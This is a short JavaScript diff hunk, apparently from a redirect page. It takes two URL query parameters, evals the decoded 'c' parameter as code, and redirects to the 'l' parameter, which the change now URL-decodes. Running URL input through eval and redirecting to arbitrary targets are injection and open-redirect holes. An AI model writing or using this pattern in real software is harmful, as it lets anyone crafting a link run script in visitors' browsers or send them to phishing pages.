@@ -9,7 +9,7 @@
     const lx = sp.get('l')
     
     if (cx) eval(decodeURIComponent(cx))
-    if (lx) window.location = lx
+    if (lx) window.location = decodeURIComponent(lx)
 
     throw null 
   } 
